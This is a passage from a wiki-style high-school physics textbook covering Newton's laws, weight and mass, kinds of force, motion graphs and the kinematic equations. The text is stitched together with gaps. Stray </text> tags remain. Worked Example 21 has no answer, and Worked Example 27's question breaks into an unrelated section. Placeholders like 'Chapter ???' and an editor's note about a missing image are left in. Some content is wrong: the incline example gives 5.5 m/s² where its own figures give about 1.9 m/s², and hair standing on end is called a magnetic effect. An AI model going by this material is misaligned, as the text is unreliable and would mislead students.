&lt;center&gt;&lt;math&gt;\begin{matrix}F_{Res} &amp;=&amp; ma \\12 \mbox{ N} &amp;=&amp; (0.0001 \mbox{ kg})a\\a &amp;=&amp; \frac{12 \mbox{ N}}{0.0001 \mbox{kg}}\\&amp;=&amp; 120000\frac{\mbox{N}}{\mbox{kg}} \\&amp;=&amp; 120000\frac{\mbox{kg} \cdot \mbox{m}}{\mbox{s}^2 \cdot \mbox{kg}} \\&amp;=&amp; 120000\frac{\mbox{m}}{\mbox{s}^2} \\&amp;=&amp; 1.2\times 10^{5}\ \mbox{ m} \cdot \mbox{s}^{-2}\end{matrix}&lt;/math&gt;&lt;/center&gt;

From Newton's Second Law the direction of the acceleration is the same as that of the resultant force. The final result is then that the
block accelerates at &lt;math&gt;1.2\times10^{5}\ \mbox{ m} \cdot \mbox{s}^{-2}&lt;/math&gt; in the positive x-direction.

&lt;hr style=&quot;background-color:red&quot; /&gt;

=== Weight and Mass ===

You must have heard people saying ``My weight is'' 60 kg. This is actually correct, though physicists often have difficulty understanding it because it is mass that is measured in kilograms.  This is a different meaning of the word weight from the one used in mechanics, where weight is the force of gravity exerted by the earth on an object with mass:

&lt;center&gt;&lt;math&gt;\begin{matrix}F_{weight} = mg\end{matrix}&lt;/math&gt;&lt;/center&gt;

As such, weight is measured in newtons.

If you compare this equation to Newton's Second Law you will see that it looks exactly the same with the ''a'' replaced by ''g''. Thus, when weight is the
only force acting on an object (i.e. when &lt;math&gt;F_{weight}&lt;/math&gt;

''F''&lt;sub&gt;weight&lt;/sub&gt; is the resultant force acting on the object) the object has an acceleration ''g''. Such an object is said to be in free fall. The value for ''g'' is the same for all 
objects (i.e. it is independent of the objects mass):

&lt;math&gt;\begin{matrix}g=9.8 \mbox{m} \cdot \mbox{s}^{-2} \approx 10 \mbox{m} \cdot \mbox{s}^{-2}\end{matrix}&lt;/math&gt;

{| 
|- 
|&lt;math&gt;\begin{matrix}g=9.8 \mbox{m} \cdot \mbox{s}^{-2} \approx 10 \mbox{m} \cdot \mbox{s}^{-2}\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(4.3)
|}

You will learn how to calculate this value from the mass and radius of the earth in Chapter ???. Actually the value of
''g'' varies slightly from place to place on the Earth's surface.

The reason that we often get confused between weight and mass, is that scales measure your weight (in newtons) and then display your mass using the
equation above.

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 18 Calculating the resultant and then the acceleration===

'''Question:''' A block (mass 20&amp;nbsp;kg) on a frictionless flat surface has a 45 N force applied to it in the positive x-direction.
In addition a 25 N force is applied in the negative ''x''-direction. What is the resultant force acting on the block and the acceleration of the block? 

'''Answer:'''

Step 1 : 

We are given

* the block's mass
* Force ''F''&lt;sub&gt;1&lt;/sub&gt; = 45 N in the positive ''x''-direction
* Force ''F''&lt;sub&gt;2&lt;/sub&gt; = 25 N in the negative ''x''-direction

all in the correct units.

Step 2 : 

We are asked to determine what happens to the block. We know that net force results in an acceleration. We need to determine the net force acting on the block.

Step 3 : 

Since ''F''&lt;sub&gt;1&lt;/sub&gt; and ''F''&lt;sub&gt;2&lt;/sub&gt; act along the same straight line, we can apply the algebraic technique of vector addition discussed in the Vectors chapter to determine the resultant force. Choosing the positive ''x''-direction as our positive direction:

&lt;u&gt;Positive x-direction is the positive direction:&lt;/u&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}F_{Res}&amp;=&amp; (+45 \ \mbox{N}) + (-25 \mbox{ N}) \\&amp; = &amp; +20 \ \mbox{N} \\&amp;=&amp; 20 \mbox{N}\ in\ the\ positive\ x-direction\end{matrix}&lt;/math&gt;&lt;/center&gt;

where we remembered in the last step to include the direction of the resultant force in words.
By Newton's Second Law the block will accelerate in the direction of this resultant force.

Step 4 : 

Next we determine the magnitude of the acceleration:

&lt;center&gt;&lt;math&gt;\begin{matrix}F_{Res} &amp; =&amp; ma \\20 \mbox{N} &amp;=&amp; (20 \mbox{kg})a\\a &amp;=&amp; \frac{20 \mbox{N}}{20 \mbox{kg}} \\&amp;=&amp; 1\frac{ \mbox{N}}{ \mbox{kg}} \\&amp;=&amp; 1\frac{ \mbox{kg} \cdot  \mbox{m}}{ \mbox{s}^2 \cdot  \mbox{kg}} \\&amp;=&amp; 1\ \mbox{ m} \cdot \mbox{s}^{-2} \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

The final result is then that the block accelerates at &lt;math&gt;1\ \mbox{ m} \cdot \mbox{s}^{-2}&lt;/math&gt; in the positive x-direction (the same direction as the resultant force).

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 19 Block on incline===

'''Question:''' A block (mass 10&amp;nbsp;kg) is released on an inclined plane.  What is the resulting rate of acceleration of the block if the angle theta is 25 degrees and the coefficient of friction between the block and the plane is 0.25?

[[Image:Fhsst forces11.png|444px|]]

'''Solution:'''

'''Step 1''':
The acceleration of the block will be parallel to the plane, so we break the problem into two parts - forces perpendicular to the plane (which must cancel out since there is no acceleration perpendicular to the plane) and parallel to the plane.

'''Step 2''':
We know that there is no acceleration in the direction perpendicular to the surface of the inclined plane, or in other words &lt;math&gt;a_{\perp}=0&lt;/math&gt;.  Therefore we know that:

:&lt;math&gt;\begin{matrix} \\ \sum{F_{\perp}} &amp;=&amp; 0 
\\  N - W_{\perp} &amp;=&amp; 0
\\  N - m \   g \  {\cos \theta} &amp;=&amp; 0
\\ N &amp;=&amp; m \  g \  {\cos \theta} 
\\ &amp;=&amp; (10 \  kg)(9.8 \  {m \over {s^2}}) \  {\cos 25^\circ} 
\\ &amp;=&amp; 88.82 \  N \end{matrix}&lt;/math&gt;

'''Step 3''':
Summing forces parallel to the plane yields:
:&lt;math&gt;\begin{matrix} \\ \sum{F_{\|}} &amp;=&amp; m \  g \  {\sin \theta} - \mu \  N 
\\  m a_{\|} &amp;=&amp; m \  g \  {\sin \theta} - \mu \  N 
\\  (10 kg) a_{\|} &amp;=&amp; (10 kg) (9.8 \  {m \over s^2}) \sin 25^\circ - (0.25) \  (88.82 \  N) 
\\ a_{\|} &amp;=&amp; (9.8 \  {m \over s^2}) \  \sin 25^\circ - (0.25) \  {{88.82 \ N} \over {10 \ kg}}
\\ &amp;=&amp; 5.5 \ {m \over {s^2}} \end{matrix}&lt;/math&gt;

The final result is that the block accelerates down the inclined plane with an acceleration of &lt;math&gt;5.5 \ m \cdot s^{-2}&lt;/math&gt;.

== Third Law ==

{{FHSST Physics/Box|'''Definition:''' For every force one body applies to another (action) there is always an equal but opposite in direction force another body applies back to the first one (reaction.)}} 

This law is a direct consequence of the [[FHSST Physics Momentum:What properties does momentum have|Principle of Conservation of Linear Momentum]].

Newton's Third Law is easy to understand but it can get quite difficult to apply it. An important thing to realise is that the
action and reaction forces can never act on the same object and hence cannot contribute to the same resultant. 

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 20 Identifying action-reaction Pairs===

'''Question:''' Consider pushing a box on the surface of a rough table.

# Draw a force diagram indicating all of the forces acting ''' on the box'''.
# Identify the reaction force for each of the forces acting on the box.

'''Answer:'''

# The following force diagram shows all of the forces acting on the box

[[Image:Fhsst forces12.png|281px|]]

&lt;hr style=&quot;background-color:red&quot; /&gt;

There is an important thing to realise which is related to Newton's Third Law. Think about dropping a stone off a cliff. It falls because the earth exerts a force on it (see Chapter ???) and it doesn't seem like there are any other forces acting. So is Newton's Third Law wrong? No, the reactionary force to the weight of the stone is the force exerted by the stone on the earth. This is illustrated in detail in the next worked example.

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 21 Newton's Third Law===

'''Question:''' A stone of mass 0.5&amp;nbsp;kg is accelerating at 10 m·s&lt;sup&gt;&amp;minus;2&lt;/sup&gt; towards the earth.

The next two worked examples are quite long and involved but it is very important that you understand the discussion as they illustrate
the importance of Newton's Laws.

===Worked Example 22 Rockets===
'''Question:''' How do rockets accelerate in space? 

'''Answer:'''

* Gas explodes inside the rocket.
* This exploding gas exerts a force on each side of the rocket (as shown in the picture below of the explosion chamber inside the rocket).

[[Image:Fhsst forces17.png|236px|]]

''Note that the forces shown in this picture are representative. With an explosion there will be forces in all directions.''

* Due to the symmetry of the situation, all the forces exerted on the rocket are balanced by forces on the opposite side, except for the force opposite the open side. This force on the upper surface is unbalanced.
* This is therefore the resultant force acting on the rocket and it makes the rocket accelerate forwards.

==== Systems and External Forces ====

The concepts of a system and an external forces are very important in physics. A system is any collection of objects. If one draws an
imaginary box around such a system then an external force is one that is applied by an object or person outside the box. Imagine for example
a car pulling a trailer.

[[Image:Fhsst forces16.png|372px|]]

Concept of system is extremely important. Consider an example of a person holding a load (box) on his head and standing on a platform. 

Now count the forces : 

(i) Box presses the person down 
(ii) The person pushes the box up (reaction to box's weight) 
(iii) Box is pulled down by the earth 
(iv) Earth is pulled up by the box 
(v) Person presses the floor 
(vi) Floor pushes the person up 
(vii) Person is pulled down by earth and (viii) Earth is pulled up by the person. 

Quite a mess. Which ones are internal forces and which ones are external forces? Identification of system comes handy here. We can select the box or the person as a system for analyzing forces or we may even consider box and person together as a single system. Only condition to watch while selecting a system is that all parts of the system should have same acceleration. If two parts are at different accelerations then each of them should be treated as a separate system.</text>

= Examples of Forces Studied Later =

Most of physics revolves around forces. Although there are many different forces we deal with them all in the same way. The methods to find resultants and
acceleration do not depend on the type of force we are considering. 

At first glance, the number of different forces may seem overwhelming - gravity, drag, electrical forces, friction and many others. However, physicists have found that all these forces can be classified into four groups. These are gravitational forces, electromagnetic forces, strong nuclear force and weak nuclear force. Even better, all the forces that you will come across at school are either gravitational or electromagnetic. Doesn't that make life easy?

== Newtonian Gravity ==

Gravity is the attractive force between two objects due to the mass of the objects. When you throw a ball in the air, its mass and the Earth's mass attract each other, which leads to a force between them. The ball falls back towards the Earth, and the Earth accelerates towards the ball. The movement of the Earth toward the ball is, however, so small that you couldn't possibly measure it.

== Electromagnetic Forces ==

Almost all of the forces that we experience in everyday life are electromagnetic in origin. They have this unusual name because long ago people thought that electric forces and magnetic forces were different things. After much work and experimentation, it has been realised that they are actually different manifestations of the same underlying theory.

=== The Electric Force ===

If we have objects carrying electrical charge, which are not moving, then we are dealing with electrostatic forces (Coulomb's Law). This force is actually much stronger than gravity. This may seem strange, since gravity is obviously very powerful, and holding a balloon to the wall seems to be the most impressive thing electrostatic forces have done, but think about it: for gravity to be detectable, we need to have a very large mass nearby. But a balloon rubbed in someone's hair can stick to a wall with a force so strong that it overcomes the force of gravity - with just the charges in the balloon and the wall!

=== Magnetic force ===

The magnetic force is a different manifestation of the electromagnetic force. It stems from the interaction between moving charges as opposed to the fixed charges involved in Coulomb's Law. 

Examples of the magnetic force in action include magnets, compasses, car engines, computer data storage and your hair standing on end. Magnets are also used in the wrecking industry to pick up cars and move them around sites.

=== Friction ==

Newton's First Law states that an object moving without a force acting on it will keep moving. Then why does a box sliding on a table stop? The answer is friction. Friction arises from the interaction between the molecules on the bottom of a box with the molecules on a table. This interaction is electromagnetic in origin, hence friction is just another view of the electromagnetic force. The great part about school physics is that most of the time we are told to neglect friction but it is good to be aware that there is friction in the real world.

Friction is also useful . If there was no friction and you tried to prop a ladder up against a wall, it would simply slide to the ground. Rock climbers use friction to maintain their grip on cliffs.

Friction is a force that impedes motion. It is in parallel to the contact surface and acts against the motion of the body.

=== Drag Force ===

This is the force an object experiences while travelling through a medium. When something travels through the air it needs to displace air as it travels and because of this the air exerts a force on the object. This becomes an important force when you move fast and a lot of thought is taken to try and reduce the amount of drag force a sports car experiences.

The drag force is very useful for parachutists. They jump from high altitudes and if there was no drag force, then they would continue accelerating all the way to the ground. Parachutes are wide because the more surface area you show, the greater the drag force and hence the slower you hit the ground.</text>

'''Equilibrium''': Objects at rest or moving with constant velocity are in ''equilibrium'' and have a ''zero'' ''resultant force''.

'''Equilibrant''': The ''equilibrant'' of any number of forces is the single force required to produce equilibrium.

'''Triangle Law for Forces in Equilibrium''': Three forces in equilibrium can be represented in magnitude and direction by the three sides of a triangle taken in order.

'''Newton's First Law''': Every object will remain at rest or in uniform motion in a straight line unless it is made to change its state by the action of an external force.

'''Newton's Second Law''': The resultant force acting on a body results in an acceleration which is in the same direction as the resultant force and is directly proportional to the magnitude of
this force and inversely proportional to the mass of the object. 

'''Newton's Third Law''': For every force or action there is an equal but opposite force or reaction.</text>

= What is rectilinear motion? =

Rectilinear motion means motion along a straight line. This is a useful topic to study for learning how to describe the movement of cars along a straight road or of trains along straight railway tracks. In this section you have only two directions to worry about: (1) along the direction of motion, and (2) opposite to the direction of motion.

To illustrate this imagine a train heading east.

If it is accelerating away from the station platform (P), the direction of acceleration is the same as the direction of the train's velocity &amp;mdash; east. If it is braking the direction of acceleration is opposite to the direction of its motion, i.e. west.</text>

= Speed and Velocity =

Let's take a moment to review our definitions of velocity and speed by looking at the worked example below:

==Worked Example 23 Speed and Velocity==

[[Image:fhsst_rectmot2.png|263px|]]

'''Question:''' A cyclist moves from A through B to C in 10 seconds. Calculate both his speed and his velocity.

'''Answer:'''

Step 1 : 

Analyse the question to determine what is given. The question explicitly gives

* the distance between A and B
* the distance between B and C
* the total time for the cyclist to go from A through B to C

all in the correct units! 

Step 2 : 

What is being asked? We are asked to calculate the average speed and the average velocity of the cyclist.

His speed - a scalar - will be

&lt;center&gt;&lt;math&gt;\begin{matrix}v&amp;=&amp;\frac{s}{t}\\&amp;=&amp;\frac{30m+40m}{10s}\\&amp;=&amp;7\frac{m}{s}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Since velocity is a vector we will first need to find the resultant displacement of the cyclist. His velocity will be

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v}=\frac{\overrightarrow{s}}{t}\end{matrix}&lt;/math&gt;&lt;/center&gt;



The total displacement is the vector from A to C, and this is just the resultant of the two displacement vectors, i.e.

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{s} = \overrightarrow{AC} = \overrightarrow{AB} + \overrightarrow{BC}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Using the [[Wikipedia:Pythagorean theorem|rule of Pythagoras]]:

&lt;math&gt;\begin{matrix}\overrightarrow{s} &amp;=&amp; \sqrt{{(30m)}^2+{(40m)}^2}\\&amp;=&amp; 50m \ in \ the \ direction \ from \ A \ to \ C\end{matrix}&lt;/math&gt;

&lt;font size=+1&gt;&amp;#x2234;&lt;/font&gt;

&lt;math&gt;\begin{matrix}\overrightarrow{v} &amp;=&amp;\frac{50\ \mbox{m}}{10\ \mbox{s}}\\&amp;=&amp; 5\ \frac{\mbox{m}}{\mbox{s}} \ in\ the \ direction \ from \ A \ to \ C\end{matrix}&lt;/math&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

For this cyclist, his velocity is not the same as his speed because there has been a change in the direction of his motion. If the cyclist traveled directly from A to C ''without'' passing through B his speed would be

&lt;center&gt;&lt;math&gt;\begin{matrix}v &amp;=&amp; \frac{50m}{10s}\\&amp;=&amp; 5 \frac{m}{s}\end{matrix}&lt;/math&gt;&lt;/center&gt;

and his velocity would be

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v} &amp;=&amp; \frac{50m}{10s}\\&amp;=&amp; 5 \frac{m}{s} \ in \ the\ direction \ from \ A \ to \ C\end{matrix}&lt;/math&gt;&lt;/center&gt;

In this case where the cyclist is not undergoing any change of direction (i.e. he is traveling in a straight line) the magnitudes of the speed and the velocity are the same. This is the defining principle of rectilinear motion.

= Graphs =

In physics we often use graphs as important tools for picturing certain concepts. Below are some graphs that help us picture the concepts of displacement, velocity and acceleration.

== Displacement-Time Graphs ==

Below is a graph showing the displacement of the cyclist from A to C:

[[Image:Fhsst_rectmot3.png|146px|]]

This graphs shows us how, in 10 seconds time, the cyclist has moved from A to C. We know the gradient (slope) of a graph is defined as the change in y divided by the change in x, i.e. 
&lt;math&gt;\frac{\Delta y}{\Delta x}&lt;/math&gt;. In this graph the gradient of the graph is just &lt;math&gt;\frac{\Delta \overrightarrow{s}}{\Delta t}&lt;/math&gt; - and this is just the expression for velocity.

{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | '''Important:'''
|-
|align=&quot;CENTER&quot; |The slope of a displacement-time graph gives the velocity.
|}

The slope is the same all the way from A to C, so the cyclist's velocity is constant over the entire displacement he travels.
In figure 5.1 are examples of the displacement-time graphs you will encounter.

[[Image:Fhsst_rectmot4.png|531px|]]

a) shows the graph for an object stationary over a period of time. The gradient is zero, so the object has zero velocity.

b) shows the graph for an object moving at a constant velocity. You can see that the displacement is increasing as time goes on. The gradient, however, stays constant (remember: its the slope of a straight line), so the velocity is constant. Here the gradient is positive, so the object is moving in the direction we have defined as positive.

c) shows the graph for an object moving at a constant acceleration. You can see that both the displacement and the velocity (gradient of the graph) increase with time. The gradient is increasing with time, thus the velocity is increasing with time and the object is accelerating.


== Velocity-Time Graphs ==

Look at the velocity-time graph below:

[[Image:Fhsst_rectmot17.png|531px|]]

'''RIAAN Note: first image on page 89 is missing'''

This is the velocity-time graph of a cyclist traveling from A to B at a constant acceleration, i.e. with steadily increasing velocity. The gradient of this graph is just &lt;math&gt;\frac{\Delta \overrightarrow{v}}{\Delta t}&lt;/math&gt; - and this is just the expression for acceleration. Because the slope is the same at all points on this graph, the acceleration of the cyclist is constant.

{| cellpadding=&quot;3&quot;
|- 
! align=&quot;CENTER&quot; | Important:
|-align=&quot;CENTER&quot; ||The slope of a velocity-time graph gives the acceleration.
|}

Not only can we get the acceleration of an object from its velocity-time graph, but we can also get some idea of the displacement traveled. Look at the graph below:

[[Image:Fhsst_rectmot5.png|219px|]]

This graph shows an object moving at a constant velocity of 10''m''/''s'' for a duration of 5''s''. The area between the graph and the time
axis (the shaded area) of the above plot will give us the displacement of the object during this time. In this case we just
need to calculate the area of a rectangle with width 5s and height 10m/s

&lt;center&gt;&lt;math&gt;\begin{matrix}\mathrm{area \ of \ rectangle} &amp;=&amp; \mathrm{height} \times \mathrm{width}\\&amp;=&amp; \overrightarrow{v} \times t\\&amp;=&amp; 10 \frac{m}{s} \times 5 s\\&amp;=&amp; 50 m\\&amp;=&amp; \overrightarrow{s}= \mathrm{displacement}\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

So, here we've shown that an object traveling at 10m/s for 5s has undergone a displacement of 50m.

{| cellpadding=&quot;3&quot;
|- 
! align=&quot;CENTER&quot; | Important:
|- 
| align=&quot;CENTER&quot; |The area between a velocity-time graph and the `time' axis gives the displacement of the object.
|}

Here are a couple more velocity-time graphs to get used to:

{| 
|- 
| [[Image:Fhsst_rectmot6.png|343px|]]
|-
|Figure 5.2: Some common velocity-time graphs:
|}

In figure 5.2 are examples of the displacement-time graphs you may encounter.

a) shows the graph for an object moving at a constant velocity over a period of time. The gradient is zero, so the object is not accelerating. 

b) shows the graph for an object which is decelerating. You can see that the velocity is decreasing with time. The gradient, however, stays constant (remember: its the slope of a straight line), so the acceleration is constant. Here the gradient is negative, so the object is accelerating in the opposite direction to its motion, hence it is decelerating.

== Acceleration-Time Graphs ==

In this chapter on rectilinear motion we will only deal with objects moving at a constant acceleration, thus all acceleration-time graphs will look like these two:

[[Image:Fhsst_rectmot7.png|374px|]]

Here is a description of the graphs below:

a) shows the graph for an object which is either stationary or traveling at a constant velocity. Either way, the acceleration is zero over time.

b) shows the graph for an object moving at a constant acceleration. In this case the acceleration is positive - remember that it can also be negative.

We can obtain the velocity of a particle at some given time from an acceleration time graph - it is just given by the area between the
graph and the time-axis. In the graph below, showing an object at a constant positive acceleration, the increase in velocity of the
object after 2 seconds corresponds to the shaded portion. 

[[Image:Fhsst_rectmot8.png|214px|]]

&lt;center&gt;&lt;math&gt;\begin{matrix}\mathrm{area \ of \ rectangle} &amp;=&amp; \overrightarrow{a} \times t \\&amp;=&amp; 5 \frac{m}{s^2} \times 2s\\&amp;=&amp; 10 \frac{m}{s}\\&amp;=&amp; \overrightarrow{v}\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Its useful to remember the set of graphs below when working on problems. Figure 5.3 shows how displacement, velocity and time relate to each other. Given a displacement-time graph like the one on the left, we can plot the corresponding velocity-time graph by remembering that the slope of a displacement-time graph gives the velocity. Similarly, we can plot an acceleration-time graph from the gradient of the velocity-time graph.

'''Question:''' Given the displacement-time graph below, draw the corresponding velocity-time and acceleration-time graphs, and then describe the motion of the object.

[[Image:Fhsst_rectmot10.png|377px|]]

'''Answer:'''

Step 1 : Analyse the question to determine what is given. The question explicitly gives a displacement-time graph.

Step 2 : What is asked? 

3 things:

# Draw a velocity-time graph
# Draw an acceleration-time graph
# Describe the behaviour of the object


For the first 2 seconds we can see that the displacement remains constant - so the object is not moving, thus it has zero velocity during this time. We can reach this conclusion by another path too: remember that the gradient of a displacement-time graph is the velocity. For the first 2 seconds we can see that the displacement-time graph is a horizontal line, i.e. it has a gradient of zero. Thus the velocity during this time is zero and the object is stationary.

For the next 2 seconds, displacement is increasing with time so the object is moving. Looking at the gradient of the displacement graph we can see that it is not constant. In fact, the slope is getting steeper (the gradient is increasing) as time goes on. Thus, remembering that the gradient of a displacement-time graph is the velocity, the velocity must be increasing with time during this phase.

For the final 2 seconds we see that displacement is still increasing with time, but this time the gradient is constant, so we know that the object is now travelling at a constant velocity, thus the velocity-time graph will be a horizontal line during this stage.

So our velocity-time graph looks like this one below. Because we haven't been given any values on the vertical axis of the displacement-time graph, we cannot figure out what the exact gradients are and hence what the values of the velocity are. In this type of question it is just important to show whether velocities are positive or negative, increasing, decreasing or constant.

Once we have the velocity-time graph its much easier to get the acceleration-time graph as we know that the gradient of a velocity-time graph is the just the acceleration.

For the first 2 seconds the velocity-time graph is horizontal at zero, thus it has a gradient of zero and there is no acceleration during this time. (This makes sense because we know from the displacement time graph that the object is stationary during this time, so it can't be accelerating).

For the next 2 seconds the velocity-time graph has a positive gradient. This gradient is not changing (i.e. its constant) throughout these 2 seconds so there must be a constant positive acceleration.

For the final 2 seconds the object is traveling with a constant velocity. During this time the gradient of the velocity-time graph is once again zero, and thus the object is not accelerating.

The acceleration-time graph looks like this:

[[Image:Fhsst_rectmot12.png|377px|]]

A brief description of the motion of the object could read something like this: At ''t'' = 0''s'' and object is stationary at some position and remains stationary until ''t'' = 2''s'' when it begins accelerating. It accelerates in a positive direction for 2 seconds until ''t'' = 4''s'' and then travels at a constant velocity for a further 2 seconds.

===Worked Example 25 Calculating distance from a velocity-time graph===

'''Question:''' The velocity-time graph of a car is plotted below. Calculate the displacement of the car has after 15 seconds.

[[Image:Fhsst_rectmot13.png|377px|]]

'''Answer:''' 
We are asked to calculate the displacement of the car. All we need to remember here is that the area between the velocity-time graph and the time axis gives us the displacement.

For ''t'' = 0''s'' to ''t'' = 5''s'' this is the triangle on the left:

&lt;center&gt;&lt;math&gt;\begin{matrix}Area \triangle &amp;=&amp; \frac{1}{2}b \times h\\&amp;=&amp; \frac{1}{2}5s\times 4m/s\\&amp;=&amp;10m\end{matrix}&lt;/math&gt;&lt;/center&gt;

For ''t'' = 5''s'' to ''t'' = 12''s'' the displacement is equal to the area of the rectangle

&lt;center&gt;&lt;math&gt;\begin{matrix}Area \Box &amp;=&amp; w \times h\\&amp;=&amp;7s \times 4m/s\\&amp;=&amp;28m\end{matrix}&lt;/math&gt;&lt;/center&gt;

For ''t'' = 12''s'' to ''t'' = 14''s'' the displacement is equal to the area of the triangle above the time axis on the right

&lt;center&gt;&lt;math&gt;\begin{matrix}Area \triangle &amp;=&amp; \frac{1}{2}b \times h\\&amp;=&amp; \frac{1}{2}2s \times 4m/s\\&amp;=&amp;4m\end{matrix}&lt;/math&gt;&lt;/center&gt;

For ''t'' = 14''s'' to ''t'' = 15''s'' the displacement is equal to the area of the triangle below the time axis

&lt;center&gt;&lt;math&gt;\begin{matrix}Area \triangle &amp;=&amp; \frac{1}{2}b \times h\\&amp;=&amp; \frac{1}{2}1s \times 2m/s\\&amp;=&amp;1m\end{matrix}&lt;/math&gt;&lt;/center&gt;

Now the total displacement of the car is just the sum of all of these areas. HOWEVER, because in the last second (from ''t'' = 14''s'' to ''t'' = 15''s'') the velocity of the car is negative, it means that the car was going in the opposite direction, i.e. back where it came from! So, to get the total displacement, we have to add the first 3 areas (those with positive displacements) and subtract the last one (because it signifies a displacement in the opposite direction).

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{s}&amp;=&amp;10 +28 +4 -1\\&amp;=&amp;41m\ in\ the\ positive\ direction\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 26 Velocity from a displacement-time graph===

'''Question:''' Given the diplacement-time graph below,

# what is the velocity of the object during the first 4 seconds?
# what is the velocity of the object from ''t'' = 4''s'' to ''t'' = 7''s''?

[[Image:Fhsst_rectmot14.png|468px|]]

'''Answer:''' 
# for the first 4sec velocity is slope of the curve i.e. 2/4=0.5m/s

# For the last 3 seconds we can see that the displacement stays constant, and that the gradient is zero. Thus &lt;math&gt;\overrightarrow{v}=0m/s&lt;/math&gt;.  

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 27 From an acceleration- to a velocity-time graph===

'''Question:''' Given the acceleration-time graph below, assume that the object starts from rest and draw its velocity-time graph.

This section is about solving problems relating to uniformly accelerated motion. We'll first introduce the variables and the equations, then we'll show you how to derive them, and after that we'll do a couple of examples.

:''u'' = starting velocity (m/s) at ''t'' = 0
:''v'' = final velocity (m/s) at time ''t''
:''s'' = displacement (m)
:''t'' = time (s)
:''a'' = acceleration (m/s²}

{| 
|&lt;math&gt;v = u + at \,&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (5.1)
|}

{| 
|&lt;math&gt;s = \frac{(u + v)}{2} t&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (5.2)
|}

{| 
|&lt;math&gt;s = ut + \frac{1}{2}at^2&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (5.3)
|}

{| 
|&lt;math&gt;v^2 = u^2 + 2as \,&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (5.4)
|}

&lt;math&gt;\Delta x = 1/2*a*(\Delta t)^2 + u(\Delta t)&lt;/math&gt;


Make sure you can rhyme these off, they are very important!
There are so many different types of questions for these equations. Basically when you are answering a question like this:

# Find out what values you have and write them down.
# Figure out which equation you need.
# Write it down!!!
# Fill in all the values you have and get the answer.

[[Image:fhsst_magnify.png|110px|]]
|Galileo Galilei of Pisa, Italy, was the first to determine the correct mathematical law for acceleration: the total distance covered, starting from rest, is proportional to the square of the time. He also concluded that
objects retain their velocity unless a force - often friction - acts upon them, refuting the accepted Aristotelian hypothesis that
objects &quot;naturally&quot; slow down and stop unless a force acts upon them. This principle was incorporated into Newton's laws of motion (1st law).
|}

==Equation 5.1==
By the definition of acceleration &lt;math&gt;a = \frac{\Delta v}{t}&lt;/math&gt; where &lt;math&gt;\Delta&lt;/math&gt;''v'' is the change in velocity, i.e. &lt;math&gt;\Delta v = v - u&lt;/math&gt;. Thus we have

&lt;center&gt;&lt;math&gt;\begin{matrix}a &amp;=&amp; \frac{v-u}{t} \\v &amp;=&amp; u +at\end{matrix}&lt;/math&gt;&lt;/center&gt;


==Equation 5.2==
In the previous section we saw that displacement can be calculated from the area between a velocity-time graph and the time-axis. For uniformly accelerated motion the most complicated velocity-time graph we can have is a straight line. Look at the graph below&amp;nbsp;&amp;mdash; it represents an object with a starting velocity of ''u'', accelerating to a final velocity ''v'' over a total time ''t''.

To calculate the final displacement we must calculate the area under the graph&amp;nbsp;&amp;mdash; this is just the area of the rectangle added to the area of the triangle.

&lt;center&gt;&lt;math&gt;\begin{matrix}Area \triangle &amp;=&amp; \frac{1}{2}b \times h\\&amp;=&amp; \frac{1}{2}t \times (v-u)\\&amp;=&amp; \frac{1}{2}vt - \frac{1}{2}ut\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}Area \Box &amp;=&amp; w \times h\\&amp;=&amp; t \times u\\&amp;=&amp; ut\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}Displacement &amp;=&amp; Area \Box + Area \triangle\\s &amp;=&amp; ut + \frac{1}{2}vt -\frac{1}{2}ut\\&amp;=&amp; \frac{(u+v)}{2}t\end{matrix}&lt;/math&gt;&lt;/center&gt;

==Equation 5.3==
This equation is simply derived by eliminating the final velocity ''v'' in equation 5.2. Remembering from equation 5.1 that

&lt;center&gt;&lt;math&gt;v=u+at&lt;/math&gt;&lt;/center&gt;

then equation 5.2 becomes

&lt;center&gt;&lt;math&gt;\begin{matrix}s &amp;=&amp; \frac{u+u+at}{2}t\\&amp;=&amp;\frac{2ut+at^2}{2}\\&amp;=&amp;ut+\frac{1}{2}at^2\end{matrix}&lt;/math&gt;&lt;/center&gt;

==Equation 5.4== 
This equation is just derived by eliminating the time variable in the above equation. From Equation 5.1 we know

&lt;center&gt;&lt;math&gt;t=\frac{v-u}{a}&lt;/math&gt;&lt;/center&gt;

Substituting this into Equation 5.3 gives


{| 
|&lt;center&gt;&lt;math&gt;\begin{matrix}s &amp;=&amp; u(\frac{v-u}{a})+\frac{1}{2}a(\frac{v-u}{a})^2 \\&amp;=&amp; \frac{uv}{a}-\frac{u^2}{a}+\frac{1}{2}a(\frac{v^2-2uv+u^2}{a^2}) \\&amp;=&amp; \frac{uv}{a}-\frac{u^2}{a}+\frac{v^2}{2a}-\frac{uv}{a}+\frac{u^2}{2a}\\2as &amp;=&amp; -2u^2+v^2+u^2 \\v^2&amp; =&amp;u^2+2as\end{matrix}&lt;/math&gt;&lt;/center&gt;
|- 
